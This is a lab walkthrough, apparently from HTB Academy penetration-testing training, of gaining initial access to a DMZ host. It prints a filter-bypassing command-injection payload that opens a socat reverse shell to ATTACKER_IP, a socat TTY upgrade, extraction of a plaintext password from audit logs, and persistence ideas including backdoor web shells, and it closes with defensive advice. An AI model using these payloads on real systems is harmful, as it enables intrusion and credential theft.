# Initial Access

## 🎯 Overview

**Initial Access** transforms **external reconnaissance** into **stable internal network foothold**. This phase focuses on converting **command injection** into **reverse shells**, **TTY upgrades**, and **privilege escalation** to establish persistent access for internal Active Directory attacks.

## 🚀 Reverse Shell Establishment

### 🔧 Socat Reverse Shell (Filter Bypass)
```bash
# Base socat command (filtered):
socat TCP4:ATTACKER_IP:PORT EXEC:/bin/bash

# Filter bypass payload:
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:ATTACKER_IP:8443${IFS}EXEC:bash

# Explanation:
%0a         # Newline character (command separator bypass)
's'o'c'a't' # Single quotes around each character (command bypass)
${IFS}      # Environment variable for space bypass
```

### 🎧 Listener Setup
```bash
# Start netcat listener
nc -nvlp 8443

# Expected connection:
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 51496
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

## 🔄 TTY Upgrade Process

### 🛠️ Socat Interactive Terminal
```bash
# 1. Start socat listener on attacker
socat file:`tty`,raw,echo=0 tcp-listen:4443

# 2. Execute from target reverse shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4443

# 3. Result: Full interactive TTY
webdev@dmz01:/var/www/html/monitoring$ id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

### 🐍 Alternative Python TTY
```bash
# Standard Python upgrade method
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Benefits of socat upgrade:
- Full terminal functionality
- Command completion support
- Text editor capability
- su/sudo/ssh compatibility
```

## 🔍 Privilege Escalation Discovery

### 📋 Audit Log Analysis
```bash
# Group membership analysis
id
# Output: uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)

# adm group privileges:
- Read access to ALL logs in /var/log
- Audit log access capabilities
- System monitoring permissions

# Audit log credential discovery
aureport --tty | less
```

### 🔐 Credential Extraction from Logs
```bash
# TTY Report analysis:
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"

# Discovered credentials:
srvadm:ILFreightnixadm!
```

### 🔺 User Escalation
```bash
# Switch to srvadm user
su srvadm
Password: ILFreightnixadm!

# Verify privilege escalation
whoami
# Output: srvadm

# Interactive bash shell
/bin/bash -i
srvadm@dmz01:/var/www/html/monitoring$
```

## 🌐 Network Position Analysis

### 📊 Network Interface Discovery
```bash
# Interface enumeration
ifconfig

# Key findings:
ens160: 10.129.203.101  # External interface
ens192: 172.16.8.120    # Internal network interface

# Network positioning:
- DMZ host with dual interfaces
- External web services exposure
- Internal AD network connectivity
- Pivot opportunity into corporate environment
```

### 🎯 Host Information
```bash
# System identification
hostname
# Output: dmz01

# User enumeration
cat /etc/passwd | grep -E "sh$"
# Active user accounts analysis

# Service analysis
ps aux | grep -v "]"
# Running processes and services

# Network connections
netstat -antup
# Active connections and listening services
```

## 🔒 Persistence Preparation

### 🛡️ Access Maintenance Strategy
```bash
# Current access chain:
1. Command injection (monitoring app)
2. Reverse shell (webdev user)
3. TTY upgrade (socat)
4. Privilege escalation (srvadm)

# Persistence considerations:
- SSH key deployment
- Backdoor web shell placement
- Service manipulation
- Scheduled task creation
```

### 📋 Next Steps Planning
```cmd
# Immediate priorities:
1. Root privilege escalation
2. Persistence mechanism establishment  
3. Internal network reconnaissance
4. Active Directory enumeration
5. Lateral movement preparation

# Intelligence gathering:
- Network topology mapping
- Domain controller identification
- Service account discovery
- Trust relationship analysis
```

## 🎯 HTB Academy Lab

### 📋 Lab Solution Summary
```cmd
# Attack chain execution:
1. Web application brute force → admin:12qwaszx
2. Command injection discovery → connection_test vulnerability
3. Filter bypass → %0a + single quotes + ${IFS}
4. Socat reverse shell → stable shell establishment
5. TTY upgrade → full terminal functionality
6. Audit log analysis → credential discovery
7. User escalation → srvadm access
8. Flag retrieval → /home/srvadm/flag.txt

# Key techniques demonstrated:
- Advanced filter bypass methods
- Professional TTY upgrade process
- Audit log credential mining
- Systematic privilege escalation
```

### 🔍 Learning Objectives
```cmd
# Technical skills:
- Command injection exploitation
- Character filter bypass techniques
- Reverse shell stabilization methods
- Linux audit log analysis

# Professional methodology:
- Systematic service testing approach
- Evidence collection during exploitation
- Privilege escalation documentation
- Network position assessment

# Real-world application:
- DMZ host compromise scenarios
- Internal network pivot preparation
- Credential discovery techniques
- Persistence planning strategies
```

## 🛡️ Defensive Recommendations

### 🔒 Application Security
```cmd
# Input validation:
- Implement strict character whitelisting
- Use parameterized commands (avoid shell_exec)
- Deploy Web Application Firewall
- Regular security code reviews

# Network security:
- DMZ network segmentation
- Internal network access controls
- Audit log monitoring and alerting
- Privilege escalation detection

# System hardening:
- Audit log access restrictions
- User privilege minimization
- Service account management
- Regular credential rotation
``` 